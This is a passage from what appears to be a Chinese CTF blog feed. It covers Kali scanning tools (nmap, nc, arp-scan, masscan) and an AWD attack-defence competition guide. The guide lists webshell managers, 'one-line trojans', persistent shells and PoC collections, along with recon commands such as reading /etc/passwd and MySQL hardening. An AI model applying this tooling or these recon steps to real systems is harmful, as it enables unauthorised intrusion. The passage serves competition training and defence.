</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">|</span>_/LICENSE.txt /MAINTAINERS.txt</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">|</span>_http-generator: Drupal <span class=\"token number\">7</span> <span class=\"token punctuation\">(</span>http://drupal.org<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 网址使用的 cms 以及版本，还有官方网址</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">111</span>/tcp <span class=\"token function\">open</span>  rpcbind <span class=\"token number\">2</span>-4 <span class=\"token punctuation\">(</span>RPC <span class=\"token comment\">#100000)  # 主机开放 111 端口</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> rpcinfo:       <span class=\"token comment\"># 正在运行 rpcbind 服务   （远程过程调用）</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span>   program version    port/proto  <span class=\"token function\">service</span>   <span class=\"token comment\"># 正在运行的 RPC 程序和端口</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/tcp   rpcbind</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">2,3</span>,4        <span class=\"token number\">111</span>/udp   rpcbind</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/tcp6  rpcbind</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100000</span>  <span class=\"token number\">3,4</span>          <span class=\"token number\">111</span>/udp6  rpcbind</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">39478</span>/udp   status</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">40676</span>/tcp   status</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">42791</span>/tcp6  status</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">100024</span>  <span class=\"token number\">1</span>          <span class=\"token number\">52968</span>/udp6  status</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Device type: general purpose</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>Running: Linux <span class=\"token number\">3</span>.X   <span class=\"token comment\"># 系统类型和内核版本</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:3</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>OS details: Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">3.16</span>   <span class=\"token comment\"># 内核版本范围</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop   <span class=\"token comment\"># 指示设备与扫描器之间的网络距离为 1 跳，表示它们在同一个局域网中。</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>Service Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">1.59</span> ms <span class=\"token number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Nmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">25.10</span> seconds</pre></td></tr></table></figure></details>\n<p>两个命令还不足以展现 nmap 的强大，在后面会深入学习</p>\n<h3 id=\"完整使用说明\"><a class=\"anchor\" href=\"#完整使用说明\">#</a> 完整使用说明</h3>\n<blockquote>\n<p>教程再好终归不如官方文档</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nc -h                 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>v1.10-47<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>连接:   <span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token function\">hostname</span> port<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>ports<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">..</span>. </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>监听入站:     <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> port <span class=\"token punctuation\">[</span>-options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>hostname<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>port<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>options:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token parameter variable\">-c</span> shell commands       命令为“-e”；prog 程序重定向，使用 /bin/sh 执行 <span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token parameter variable\">-e</span> filename             连接后执行的程序<span class=\"token punctuation\">[</span>危险！！<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token parameter variable\">-b</span>                      允许广播</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token parameter variable\">-g</span> gateway              网关源路由跳跃点，最多 <span class=\"token number\">8</span> 个</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token parameter variable\">-G</span> num                  源路由指针：4, <span class=\"token number\">8</span>, <span class=\"token number\">12</span>, <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token parameter variable\">-h</span>                      this cruft  这个废话,就是帮助</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token parameter variable\">-i</span> secs                 发送线路、扫描端口的延迟间隔</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token parameter variable\">-k</span>                      设置套接字上的 keepalive 选项</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token parameter variable\">-l</span>                      监听模式，用于入站连接</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token parameter variable\">-n</span>                      仅数字 IP 地址，无 DNS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token parameter variable\">-o</span> <span class=\"token function\">file</span>                 文件十六进制转储流量</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token parameter variable\">-p</span> port                 本地端口号</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token parameter variable\">-r</span>                      随机化本地和远程端口</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token parameter variable\">-q</span> secs                 在 stdin 上的 EOF 和延迟秒后退出</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token parameter variable\">-s</span> addr                 本地源地址</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token parameter variable\">-T</span> tos                  设置服务类型</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token parameter variable\">-t</span>                      应答TELNET协商</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token parameter variable\">-u</span>                      UDP模式</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token parameter variable\">-v</span>                      verbose <span class=\"token punctuation\">[</span>使用两次以更加详细<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token parameter variable\">-w</span> secs                 连接和最终网络读取的超时时间</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token parameter variable\">-C</span>                      发送 CRLF 作为行结束符</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token parameter variable\">-z</span>                      零 I/O 模式 <span class=\"token punctuation\">[</span>用于扫描<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>port numbers can be individual or ranges: lo-hi <span class=\"token punctuation\">[</span>inclusive<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>hyphens <span class=\"token keyword\">in</span> port names must be backslash escaped <span class=\"token punctuation\">(</span>e.g. <span class=\"token string\">'ftp\\-data'</span><span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 端口号可以是单个端口号，也可以是范围：lo-hi [包含]；</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 端口名称中的连字符必须使用反斜杠转义（例如 “ftp\\-data”）。</span></pre></td></tr></table></figure><h1 id=\"后话\"><a class=\"anchor\" href=\"#后话\">#</a> 后话</h1>\n<p>nc、netcat、nmap……kali 还有多少不可估量的工具等着自己发掘</p>\n<h2 id=\"题外话1arp-scan\"><a class=\"anchor\" href=\"#题外话1arp-scan\">#</a> 题外话 1：<a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">arp-scan</a></h2>\n<p><strong>什么是 ARP</strong><br />\n 地址解析协议（Address Resolution Protocol），其基本功能为通过目标设备的 IP 地址，查询目标设备的 MAC 地址，以保证通信的顺利进行。 它是 IPv4 中网络层必不可少的协议，是根据 IP 地址获得物理地址 MAC 的一个 TCP/IP 协议。通过 ARP，在局域网可以很容易构成一个 ARP 欺骗，从而得到有用数据信息。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>作业</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-v</td>\n<td>显示详细的进度消息</td>\n</tr>\n<tr>\n<td>-V</td>\n<td>显示版本</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>使用网络接口</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>从文件中读取主机名或地址</td>\n</tr>\n<tr>\n<td>-I</td>\n<td>从接口地址和网络掩码（包括网络和广播）生成列表</td>\n</tr>\n</tbody>\n</table>\n<p>常用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">--localnet</span>   <span class=\"token comment\"># 发送 ARP 请求扫描本地网络中的活动主机，并显示它们的 MAC 地址和 IP 地址。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-I</span> eth0 <span class=\"token parameter variable\">--rtt</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># 在指定网络接口（例如 eth0）上执行 ARP 扫描，同时显示每个主机的往返时间（RTT）</span></pre></td></tr></table></figure><p><a href=\"https://cn.linuxos.info/command/arp-scan\">arp-scan - 参考手册、选项、命令示例 (linuxos.info)</a></p>\n<h2 id=\"题外话2masscan\"><a class=\"anchor\" href=\"#题外话2masscan\">#</a> 题外话 2：<a href=\"http://t.csdnimg.cn/2uU8h\">Masscan</a></h2>\n<blockquote>\n<p>Masscan 是一款快速、高性能的开源端口扫描工具，旨在以极高的速度扫描整个互联网的 IPv4 地址空间。它的设计目标是快速、灵活且适用于大规模的端口扫描任务。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>masscan <span class=\"token operator\">&lt;</span>IP或网段<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>端口号或端口范围<span class=\"token operator\">></span> <span class=\"token parameter variable\">--rate</span> <span class=\"token operator\">&lt;</span>每秒发送数据包数量<span class=\"token operator\">></span>（一般十万或一百万）</pre></td></tr></table></figure><p>其他参数详解：</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>--excludefile filename</td>\n<td>排除文件中的选项</td>\n</tr>\n<tr>\n<td>-oX filename</td>\n<td>输出到 filename 的 XML</td>\n</tr>\n<tr>\n<td>-oG filename</td>\n<td>输出到 filename 在的 grepable 格式</td>\n</tr>\n<tr>\n<td>-oJ filename</td>\n<td>输出到 filename 在 JSON 格式。</td>\n</tr>\n</tbody>\n</table>\n<p>主打一个快捷迅速</p>\n<h2 id=\"题外话3httpscan\"><a class=\"anchor\" href=\"#题外话3httpscan\">#</a> 题外话 3：<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></h2>\n<p><a href=\"https://github.com/zer0h/httpscan\">项目地址</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>httpscan.py <span class=\"token number\">192.168</span>.0.0/24 –t <span class=\"token number\">10</span></pre></td></tr></table></figure><blockquote>\n<p>httpscan 是一个扫描指定 CIDR 网段的 Web 主机的小工具。和端口扫描器不一样，httpscan 是以爬虫的方式进行 Web 主机发现，因此相对来说不容易被防火墙拦截。</p>\n</blockquote>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接：</h1>\n<p><a href=\"https://nmap.org/man/zh/index.html\">官方文档：</a><a href=\"https://nmap.org/man/zh/index.html\">https://nmap.org/man/zh/index.html</a></p>\n<p><a href=\"http://t.csdnimg.cn/iN9Wc\">http://t.csdnimg.cn/iN9Wc</a></p>\n<p><a href=\"http://t.csdnimg.cn/2uU8h\">http://t.csdnimg.cn/2uU8h</a></p>\n<p><a href=\"https://gitcode.com/royhills/arp-scan?utm_source=artical_gitcode\">https://gitcode.com/royhills/arp-scan</a></p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test",
                "Attack and Defence"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "url": "https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/",
            "title": "AWD初体验",
            "date_published": "2024-04-14T04:40:23.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-14</span><br />\nPunhacker 即兴安排了一次 awd 攻防对抗赛，下午 4 点发通知晚上 8 点开始打两小时。<br />\n加固时间仅 10 分钟，而没有接触过 awd 不知道忙活什么地方，一边看着文章一边下载工具，仅 40 分钟被攻破 4 次……</p>\n<h1 id=\"awd攻略\"><a class=\"anchor\" href=\"#awd攻略\">#</a> AWD 攻略</h1>\n<h1 id=\"比赛流程\"><a class=\"anchor\" href=\"#比赛流程\">#</a> 比赛流程</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 SSH 或者 VNC 的用户名和密码，还有相关 IP 等信息</p>\n</li>\n<li class=\"lvl-2\">\n<p>安全加固环节：我们需要先自己去登录靶机服务器，进行 30 分钟的安全加固（源码备份 / 弱口令修改 / 代码审计和修复 / 漏洞修复等）</p>\n</li>\n<li class=\"lvl-2\">\n<p>自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令 / Web 漏洞 / 系统漏洞等）获得 Flag 进行加分，对应队伍失分</p>\n</li>\n</ul>\n<h1 id=\"赛前准备\"><a class=\"anchor\" href=\"#赛前准备\">#</a> 赛前准备</h1>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>基础工具：<a href=\"https://portswigger.net/burp\">Burpsuite</a>、<a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a>、<a href=\"https://www.kali.org/\">kali</a>(nmap、masscan、nc、searchsploit、Metasploit、Hydra)、<a href=\"https://www.xshell.com/zh/xshell/\">Xshell</a>、<a href=\"https://www.xshell.com/zh/xftp/\">Xftp</a>、<a href=\"https://github.com/raddyfiy/caidao-official-version\">菜刀</a>或<a href=\"https://github.com/AntSwordProject/antSword\">蚁剑</a>、<a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>、Chrome、Firefox 各类插件（[hackbar (<a href=\"https://addons.mozilla.org/zh-CN/firefox/addon/hackbartool/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search\">https://addons.mozilla.org/zh-CN/firefox/addon/hackbartool/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search</a>)]）、基础 waf（第三方 waf）、<a href=\"https://github.com/zer0h/httpscan\">httpscan</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>图形化工具：Xterminal、Nessus（扫描工具）、TscanPlus、D 盾、代码审计工具（seay、Rips）</p>\n</li>\n<li class=\"lvl-2\">\n<p>一句话木马：php、asp、aspx、jsp、内存马</p>\n</li>\n<li class=\"lvl-2\">\n<p>代码审计工具：<a href=\"https://github.com/f1tz/cnseay\">seay</a>、Rips</p>\n</li>\n<li class=\"lvl-2\">\n<p><a href=\"http://t.csdnimg.cn/JmIxf\">不死马；反不死马</a></p>\n</li>\n<li class=\"lvl-2\">\n<p>提前准备好各种 cms 的 poc exp （因为可能不允许联网）phpwin phpcms dz <a href=\"https://github.com/Mr-xn/Penetration_Testing_POC\">戳这里</a></p>\n</li>\n</ul>\n<h1 id=\"登录靶机\"><a class=\"anchor\" href=\"#登录靶机\">#</a> 登录靶机</h1>\n<h2 id=\"ssh登录注意端口\"><a class=\"anchor\" href=\"#ssh登录注意端口\">#</a> ssh 登录（注意端口）</h2>\n<blockquote>\n<p>windows：finalshell、Xshell<br />\nLinux： <code>ssh -p [port] [username]@[host]</code></p>\n</blockquote>\n<div class=\"note warning\">\n<p>** 注意：** 比赛通常都不会给 root 用户而是给一般用户，此时重点防御 <code>/var/html/</code>  下的服务，不用花过多时间去提权</p>\n</div>\n<h1 id=\"收集信息\"><a class=\"anchor\" href=\"#收集信息\">#</a> 收集信息</h1>\n<h2 id=\"明确linux机器信息\"><a class=\"anchor\" href=\"#明确linux机器信息\">#</a> 明确 Linux 机器信息</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span>                       //系统信息</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-aux</span>                        //查询进程信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> 进程名称         //筛选指定进程</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">id</span>                             //用于显示用户ID，以及所属群组ID</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">cat</span> /etc/passwd                //查看用户情况</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">ls</span> /home/                      //查看用户情况</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> d <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-002</span>      //可写目录检查</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">ifconfig</span>                       //Linux上查看网卡信息</pre></td></tr></table></figure><h2 id=\"查看服务\"><a class=\"anchor\" href=\"#查看服务\">#</a> 查看服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-nptl</span> <span class=\"token comment\"># 推荐使用，注意 Local Address 为 0.0.0.0 是公共访问，注意弱口令等</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24 <span class=\"token comment\"># 本机使用</span></pre></td></tr></table></figure><p>一般来说，各个靶机服务的端口是一样的，获取自己主机的端口活动情况，再获取其他主机的 ip 地址。然后就开始攻守的任务</p>\n<h2 id=\"查看开放端口\"><a class=\"anchor\" href=\"#查看开放端口\">#</a> 查看开放端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span>                                                       //查看活动连接</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">netstat</span> -ano/-a                                               //查看端口情况</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-anp</span>                                                  //查看端口</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--zone</span><span class=\"token operator\">=</span> public --remove-port<span class=\"token operator\">=</span><span class=\"token number\">80</span>/tcp –permanent   //关闭端口</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>firewall-cmd –reload                                          //防火墙重启</pre></td></tr></table></figure><h1 id=\"防守defence\"><a class=\"anchor\" href=\"#防守defence\">#</a> 防守（defence）</h1>\n<h2 id=\"查找本地flag\"><a class=\"anchor\" href=\"#查找本地flag\">#</a> 查找本地 flag</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token string\">\"flag\"</span> /var/www/html/  //Linux：在Web目录下查找flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>findstr /s /i <span class=\"token string\">\"flag\"</span> *.*       //Windows：当前目录以及所有子目录下的所有文件中查找<span class=\"token string\">\"flag\"</span>这个字符串</pre></td></tr></table></figure><p><strong>每一处 flag 都有洞，查看版本查询对应的 cve 进行进一步的加固</strong></p>\n<h2 id=\"修改密码\"><a class=\"anchor\" href=\"#修改密码\">#</a> 修改密码</h2>\n<p>若 ssh 登录时用的弱密码，则登录后马上改密码<br />\n弱口令密码更改<br />\n Mysql 密码默认都是 root，phpstudy 默认密码 123456</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@8 ~<span class=\"token punctuation\">]</span>$ <span class=\"token function\">passwd</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Changing password <span class=\"token keyword\">for</span> user root.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>New password: </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Retype new password: </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>passwd: all authentication tokens updated successfully.</pre></td></tr></table></figure><p>修改当前用户的密码，提权 root 后也可以修改 root 密码，若失败<a href=\"http://t.csdnimg.cn/FDcgD\">戳这里</a><br />\n同时 web 服务、web 后台管理员、数据库也都需要修改密码（不建议重复使用密码）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span> password <span class=\"token keyword\">for</span> root<span class=\"token variable\">@ip</span> <span class=\"token operator\">=</span> password<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- 或者</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">update</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">set</span> password <span class=\"token operator\">=</span> PASSWORD<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">where</span> <span class=\"token keyword\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- 重新加载授权表，使最新的权限更改生效</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flush <span class=\"token keyword\">privileges</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- 需要以具有足够权限的用户身份登录到 MySQL 数据库才能执行这些操作</span></pre></td></tr></table></figure><h2 id=\"备份\"><a class=\"anchor\" href=\"#备份\">#</a> 备份</h2>\n<h3 id=\"备份数据库\"><a class=\"anchor\" href=\"#备份数据库\">#</a> 备份数据库</h3>\n<p>找到数据库备份文件： <code>mysql --help|grep 'cnf'</code> ；也可能在 /var/lib/mysql 下，找到 db_name、db_user 和 db_passwd</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">></span> bak.sql</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 备份指定数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysqldump --all-databases <span class=\"token operator\">></span> bak.sql </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 备份所有数据库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>mysqldump <span class=\"token parameter variable\">-uroot</span> <span class=\"token parameter variable\">-proot</span> --all-databases --skip-lock-tables <span class=\"token operator\">></span> /tmp/db.sql</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 无 lock tables 权限的解决方法</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> db_user <span class=\"token parameter variable\">-p</span> db_passwd db_name <span class=\"token operator\">&lt;</span> bak.sql</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 还原指定数据库</span></pre></td></tr></table></figure><p>还原数据库也可以：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> test <span class=\"token punctuation\">;</span><span class=\"token comment\">-- 建立要还原的数据库</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">use</span> test<span class=\"token punctuation\">;</span><span class=\"token comment\">-- 切换到刚创建的数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> source test<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- 导入数据库</span></pre></td></tr></table></figure><h3 id=\"关闭-mysql-远程登录\"><a class=\"anchor\" href=\"#关闭-mysql-远程登录\">#</a> 关闭 MySQL 远程登录：</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ mysql <span class=\"token parameter variable\">-u</span> root <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> use mysql<span class=\"token punctuation\">;</span><span class=\"token comment\"># 切换数据库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span> update user <span class=\"token builtin class-name\">set</span> <span class=\"token function\">host</span> <span class=\"token operator\">=</span> <span class=\"token string\">'localhost'</span> where <span class=\"token assign-left variable\">user</span><span class=\"token operator\">=</span><span class=\"token string\">'root'</span> and <span class=\"token assign-left variable\">host</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> flush privileges<span class=\"token punctuation\">;</span><span class=\"token comment\"># 重新加载授权表，使最新的权限更改生效</span></pre></td></tr></table></figure><p>检查隐藏用户：查看 home 目录下是否有其他用户，/etc/passwd 是否有 /bin/bash 的用户</p>\n<blockquote>\n<p>对于 MySQL 的攻防，<a href=\"https://blog.zgsec.cn/archives/26.html\">戳这里</a></p>\n</blockquote>\n<p>MySQL 默认配置文件路径：</p>\n<blockquote>\n<p>C:\\Program Files\\MySQL\\MySQLServer 5.1\\my.ini   ------Windows<br />\n/etc/my.cnf ------Linux<br />\n/etc/mysql/my.cnf ------Linux</p>\n</blockquote>\n<p>修改 secure_file_priv 参数（日志功能的对应目录）<br />\n 